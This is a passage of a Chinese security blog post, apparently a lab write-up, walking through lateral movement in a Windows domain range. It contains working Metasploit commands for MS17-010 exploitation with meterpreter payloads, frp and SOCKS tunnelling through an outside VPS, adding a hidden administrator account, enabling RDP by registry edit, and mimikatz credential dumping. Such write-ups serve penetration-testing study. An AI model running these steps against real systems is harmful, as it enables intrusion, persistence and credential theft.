+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233558331.png" srcset="/img/loading.gif" lazyload alt="image-20230111233558331"></p>
+<p>防火墙相关信息，关闭防火墙</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233915168.png" srcset="/img/loading.gif" lazyload alt="image-20230111233915168"></p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111234112564.png" srcset="/img/loading.gif" lazyload alt="image-20230111234112564"></p>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><h4 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h4><p>这台主机不是域成员所以还得横向攻击拿到域成员主机权限，探测域内存活主机的方式有很多</p>
+<p>icmp</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %i in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO home.php?mod=space&amp;uid=<span class="hljs-number">294246</span> -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.%i | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>fscan <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
+<p>上传一个fscan扫描<code>.\fscan64.exe -h 192.168.52.1/24 &gt; 1.txt</code></p>
+<p>可以看到域内还有两台主机，<code>192.168.52.143</code>域成员 <code> 192.168.52.138</code>域控 两台主机都能打<code>MS17-010</code></p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111235450772.png" srcset="/img/loading.gif" lazyload alt="image-20230111235450772"></p>
+<h4 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h4><p>有好多种方式可以代理，可以用Meterpreter的socks代理，或者ssh隧道或者frp穿透等等。</p>
+<p>如果只需要代理转发一个端口，可以用portfwd进行端口转发.命令执行之后，会将192.168.47.128的3389端口转发到本地的2222端口。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">portfwd</span> add -l <span class="hljs-number">2222</span> -r <span class="hljs-number">192.168.47.128</span> -p <span class="hljs-number">3389</span><br></code></pre></div></td></tr></table></figure>
+
+<p>这里使用msf搭建socks代理，先添加路由</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> autoroute -s <span class="hljs-number">192.168.52.0</span>/<span class="hljs-number">24</span><br></code></pre></div></td></tr></table></figure>
+
+<h5 id="搭建Socks4a代理"><a href="#搭建Socks4a代理" class="headerlink" title="搭建Socks4a代理"></a><strong>搭建Socks4a代理</strong></h5><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">use auxiliary/server/socks_proxy<br>set version 4a<br>set srvhost 192.168.101.3<br>set srvport 1080<br>exploit<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230112235531659.png" srcset="/img/loading.gif" lazyload alt="image-20230112235531659"></p>
+<p>修改一下proxychains配置文件，即可实现代理。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -p <span class="hljs-number">1</span>-<span class="hljs-number">1000</span> -Pn -sT <span class="hljs-number">192.168.52.0</span>/<span class="hljs-number">24</span><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114014637904.png" srcset="/img/loading.gif" lazyload alt="image-20230114014637904"></p>
+<p>浏览器使用sock4代理，可以访问到了<code>192.168.52.141</code>了</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114015311207.png" srcset="/img/loading.gif" lazyload alt="image-20230114015311207"></p>
+<h5 id="使用frp"><a href="#使用frp" class="headerlink" title="使用frp"></a>使用frp</h5><p><code>frp</code>作为反向代理工具胜在稳定，但是其依赖配置文件，溯源容易。 <a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>公网vps主机<code>frps.ini</code>文件</p>
+<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = password<br></code></pre></div></td></tr></table></figure>
+
+<p>启动<code>frps</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></div></td></tr></table></figure>
+
+<p>目标内网主机<code>frpc.ini</code>文件</p>
+<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = password<br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">7004</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></div></td></tr></table></figure>
+
+<p>启动<code>frpc</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">.<span class="hljs-regexp">/frpc -c ./</span>frpc.ini<br></code></pre></div></td></tr></table></figure>
+
+<p>本地攻击机修改<code>/etc/prxoychains.conf</code>配置文件即可</p>
+<figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">socks<span class="hljs-number">5</span>  <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">7004</span><br></code></pre></div></td></tr></table></figure>
+
+<h5 id="使用nps"><a href="#使用nps" class="headerlink" title="使用nps"></a>使用nps</h5><p>略</p>
+<h4 id="横向攻击"><a href="#横向攻击" class="headerlink" title="横向攻击"></a>横向攻击</h4><p>扫描一下<code>192.168.52.141</code>，这里就开了3389并且关闭了。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114024831843.png" srcset="/img/loading.gif" lazyload alt="image-20230114024831843"></p>
+<p>前面fscan已经扫出来大概率存在<code>smb_ms17_010</code>漏洞，也可以再扫描一遍。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span><br><span class="hljs-attribute">set</span> rhosts <span class="hljs-number">192.168.52.141</span><br><span class="hljs-attribute">run</span><br></code></pre></div></td></tr></table></figure>
+
+<p>很明显存在漏洞</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114011400208.png" srcset="/img/loading.gif" lazyload alt="image-20230114011400208"></p>
+<p>利用msf进行攻击，最初是失败了因为靶机是32位系统，这个exp只支持64位得。32位得攻击脚本得手动下载(<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/91051614">下载地址</a>)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/windows/smb/eternalblue_doublepulsar<br><span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> PROCESSINJECT lsass.exe<br><span class="hljs-builtin-name">set</span> RHOSTS 192.168.52.141<br><span class="hljs-builtin-name">set</span> LPORT 7777<br>run<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114012425214.png" srcset="/img/loading.gif" lazyload alt="image-20230114012425214"></p>
+<p>不过发现还是失败</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114023144163.png" srcset="/img/loading.gif" lazyload alt="image-20230114023144163"></p>
+<p>后面使用<code>ms17_010_command</code>执行命令是成功的，发现就是<code>Administrator</code>用户。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/admin/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_command<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114023104546.png" srcset="/img/loading.gif" lazyload alt="image-20230114023104546"></p>
+<p>这里参考网上的一篇文章利用<code>ms17_010_psexec</code>尝试打shell，但有一下要求</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">为了能够使用exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_psexec：<br>您可以任意使用有效的用户名和密码绕过这些大部门要求<br><span class="hljs-number">1</span>.防火墙必须允许SMB流量出入<br><span class="hljs-number">2</span>.目标必须使用SMBv1协议<br><span class="hljs-number">3</span>.目标必须缺少MS17-<span class="hljs-number">010</span>补丁<br><span class="hljs-number">4</span>.目标必须允许匿名IPC $和管道名<br></code></pre></div></td></tr></table></figure>
+
+<p>关于注册表(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcxblogs/p/13444855.html">参考</a>)</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">set command REG ADD  HKLM<span class="hljs-symbol">\\</span>SYSTEM<span class="hljs-symbol">\\</span>CurrentControlSet<span class="hljs-symbol">\\</span>Control<span class="hljs-symbol">\\</span>Terminal<span class="hljs-symbol">\&quot;</span> <span class="hljs-symbol">\&quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f   开启rdesktop<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114030243880.png" srcset="/img/loading.gif" lazyload alt="image-20230114030243880"></p>
+<p>添加用户，该模块比msf上其它几个MS17-010 漏洞利用模块要稳定，但是需要管道名，利用中经常会出现找不到管道名的情况，可以通过 auxiliary/scanner/smb/pipe_auditor 模块扫描目标可用的管道名设置NAMEDPIPE参数，或者设置smbuser和smbpass进行自动查找可用管道利用。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> command net<span class="hljs-built_in"> user </span>kkfine123 Kk456123 /<span class="hljs-builtin-name">add</span>	<br>run<br><span class="hljs-builtin-name">set</span> command net localgroup administrators kkfine123 /<span class="hljs-builtin-name">add</span>  <br>run<br><span class="hljs-builtin-name">set</span> command net localgroup administrators    <br>run<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114030649450.png" srcset="/img/loading.gif" lazyload alt="image-20230114030649450"></p>
+<p>使用<code>exploit/windows/smb/ms17_010_psexec </code>拿shell</p>
+<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use exploit/windows/smb/ms17_010_psexec <br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.52.141</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser kkfine123</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass Kk456123</span><br>run<br></code></pre></div></td></tr></table></figure>
+
+<p>但得多是几次因为很容易打成蓝屏。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114035342826.png" srcset="/img/loading.gif" lazyload alt="image-20230114035342826"></p>
+<p>但还是无法攻击获得session，sessions一旦创建就die了。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230205212551075.png" srcset="/img/loading.gif" lazyload alt="image-20230205212551075"></p>
+<p>后面发现把payload 换成<code>windows/shell/bind_tcp</code>就可以了。至此我们就拿下了内网两台主机了，只剩下域控了。这里也很容易理解，如果用反向连接攻击机可以通过跳板机进入内网，但是内网里面的主机是无法ping通我们攻击机的，用正向的话让靶机监听一个端口，攻击机通过跳板机就能连接上去了。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230205212741436.png" srcset="/img/loading.gif" lazyload alt="image-20230205212741436"></p>
+<p>这里还有种方法就是利用上述的command模块打开3389远程桌面，然后使用rdesktop来进行文件夹共享来运行我们的马。并且还能使用MS06-040漏洞攻击。</p>
+<p>但是通过<code>windows/shell/bind_tcp</code>似乎只有cmd命令行，upload一个msfvenom生成的exe上去再起handler监听即可获取meterpreter。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230206010030215.png" srcset="/img/loading.gif" lazyload alt="image-20230206010030215"></p>
+<p>我本地很怪试了很多种方法也没能获取到meterpreter，大部分都是直接die。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230210225125926.png" srcset="/img/loading.gif" lazyload alt="image-20230210225125926"></p>
+<h5 id="获取凭证"><a href="#获取凭证" class="headerlink" title="获取凭证"></a>获取凭证</h5><p>加载mimikatz直接creds_wdigest即可</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230210225237063.png" srcset="/img/loading.gif" lazyload alt="image-20230210225237063"></p>
+<h5 id="攻击域控"><a href="#攻击域控" class="headerlink" title="攻击域控"></a>攻击域控</h5><p>进行常规扫描，发现<code>MS17-010</code>漏洞，其实打法也有很多种，可以用pkexec执行命令开3389，然后远程连接配置防火墙，再打一个正向meterpreter回来即可</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230210214332532.png" srcset="/img/loading.gif" lazyload alt="image-20230210214332532"></p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230210225811531.png" srcset="/img/loading.gif" lazyload alt="image-20230210225811531"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/01/2023-2-1-rwctf%20blockchain%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">RWCTF blockchain复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
